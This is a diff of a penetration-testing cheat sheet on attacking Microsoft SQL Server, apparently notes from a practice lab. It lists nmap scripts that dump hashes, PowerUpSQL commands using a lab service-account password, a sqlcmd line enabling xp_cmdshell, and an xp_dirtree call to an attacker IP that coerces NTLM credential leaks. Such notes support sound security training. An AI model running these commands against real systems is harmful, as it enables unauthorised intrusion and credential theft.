@@ -3,14 +3,22 @@
 ##### Enumeration
 
 TEST DEFAULT CREDENTIALS.
-Invoke-SQLDumpInfo -Verbose
-Invoke-SQLAudit -Verbose -Instance SQLServer1
-sqlcmd.exe -S nagoya.nagoya-industries.com -U administrator -Q "EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
-Get-SQLInstanceDomain -Verbose -DomainAccount svc_mssql
-sqlcmd.exe -Q "use master; exec xp_dirtree '\\192.168.45.221\share\test'" -S nagoya.nagoya-industries.com
+
 ````
 nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip
 ````
+
+#### PowerUpSQL
+
+```bash
+Invoke-SQLDumpInfo -Username nagoya-industries.com\svc_mssql -password Nagoya2023 -Verbose
+Get-SQLInstanceLocal -Username nagoya-industries.com\svc_mssql -password Nagoya2023 -Verbose
+Invoke-SQLAudit -Verbose -Instance SQLServer1
+Invoke-SQLAudit -Username nagoya-industries.com\svc_mssql -password Nagoya2023 -Verbose
+sqlcmd.exe -S nagoya.nagoya-industries.com -U administrator -Q "EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
+Get-SQLInstanceDomain -Verbose -DomainAccount svc_mssql
+sqlcmd.exe -Q "use master; exec xp_dirtree '\\192.168.45.221\share\test'" -S nagoya.nagoya-industries.com`
+```
 
 ##### Impacket
 
